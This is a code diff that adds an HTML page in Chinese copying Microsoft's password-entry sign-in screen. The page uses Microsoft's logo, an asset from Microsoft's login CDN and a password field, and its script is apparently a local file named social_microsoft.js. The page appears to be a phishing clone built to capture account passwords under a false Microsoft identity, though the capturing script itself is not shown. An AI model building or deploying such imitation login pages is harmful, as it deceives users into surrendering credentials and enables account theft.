@@ -1,0 +1,84 @@
+﻿<!DOCTYPE html>
+<html>
+    <head>
+        <title></title>
+        <script src="/resource/javascript/social_microsoft.js">
+            
+        </script>
+        <script src="/resource/javascript/config.js"></script>
+    </head>
+    <body>
+        <div align="center">
+            <div style="width: 100%;height: 30px;"></div>
+        </div>
+        <div align="center">
+            <style>
+                .logo{
+                    width: 300px;
+                    height: 90px;
+                    background-image: url(/resource/image/microsoft.png);
+                    background-repeat: no-repeat;
+                    background-size: 100%;
+                }
+                .back{
+                    width: 300px;
+                    height:80px;
+                    background-color: white;
+                    color: black;
+                    border-top: none;
+                    border-right: none;
+                    border-left: none;
+                    font-size: 30px;
+                    float: left;
+                    text-align: left;
+                    border: none;
+                }
+            </style>
+            <div style="width: 95%;" align="left">
+                <div class="logo"></div>
+                <button class="back" onclick="back()" id="back">
+                    <span>
+                        <style>
+                            .img{
+                                width: 30px;
+                                height: 30px;
+                                background-size: 100%;
+                                border: none;
+                                background-image: url(https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg);
+                            }
+                            .in{
+                                width: 100%;
+                                height: 100px;
+                                border-top: none;
+                                border-left: none;
+                                border-right: none;
+                                font-size: 40px;
+                                outline:none;;
+                            }
+                        </style>
+                        <img class="img" />
+                    </span>
+                    <span style="font-size: 40px;"> 返回</span>
+                </button>
+            </div>
+        </div>
+        <div style="width: 100%;height: 100px;"></div>
+        <div align="center">
+            <div style="width: 90%;" align="left">
+                <h1 style="font-size: 55px;">输入密码</h1>
+                <input type="password" class="in" placeholder="密码" id="password" />
+                <table>
+                    <td>
+                        <p style="font-size: 30px;color: #0067b8;">忘记了密码?</p>
+                    </td>
+                </table>
+                <p style="font-size: 30px;color: #0067b8">其他登录方式</p>
+                <div align="right">
+                    <button onclick="finish()" style="width: 300px;height: 80px;background-color: #0067b8;color: white;font-size: 40px;border: #0067b8;">
+                        <span>登录</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
